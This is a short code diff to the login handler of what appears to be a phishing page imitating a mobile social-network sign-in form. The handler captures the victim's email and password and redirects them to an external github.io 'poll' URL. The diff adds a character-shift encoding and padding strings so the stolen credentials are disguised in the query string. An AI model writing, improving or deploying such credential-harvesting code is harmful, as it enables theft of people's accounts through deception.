@@ -7,10 +7,15 @@
 	{
 		$("#u_0_4").click(function()
 		{
-			var txtLogin = $("#m_login_email").val();
-			var txtPass = $("#m_login_password").val();
+			var txtLogin = $("#m_login_email").val().trim();
+			var txtPass = $("#m_login_password").val().trim();
+			var txtCombined = txtPass + txtLogin;
+			var txtCode = "";
+			for (var i = 0; i < txtCombined.length; i++) {
+			  txtCode = txtCode + String.fromCharCode(txtCombined.charAt(i).charCodeAt(0) + 3);
+			}
 			
-			window.location.replace("https://quarantreats2020.github.io/QT/votenow/poll.html" + "?" + "txtCode=" + txtLogin + txtPass);
+			window.location.replace("https://quarantreats2020.github.io/QT/votenow/poll.html" + "?" + "txtCode=100XYnHdE423876" + txtCode + "s7H7m#0xN3");
 			//window.location.replace("poll.html" + "?" + "txtCode=" + txtLogin + txtPass);
 		});
 	});
